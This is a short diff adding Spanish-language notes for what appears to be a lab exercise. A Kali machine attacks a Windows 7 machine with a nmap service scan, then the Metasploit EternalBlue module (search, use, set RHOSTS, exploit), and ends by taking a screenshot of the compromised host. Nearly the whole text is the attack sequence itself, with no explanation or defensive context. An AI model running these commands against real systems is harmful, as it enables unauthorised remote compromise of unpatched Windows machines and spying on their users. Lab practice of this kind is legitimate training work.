@@ -1,0 +1,16 @@
+++ PC1: Kali
+++ PC2: Windows 7
+
+++ Comandos a ejecutar en PC1
+--- nmap -sV <ip_PC2>
+--- msfconsole 
+--- search eternalblue
+--- use 0
+--- show options
+--- set RHOSTS <ip_PC2>
+--- exploit
+--- screenshot
+
+
+
+
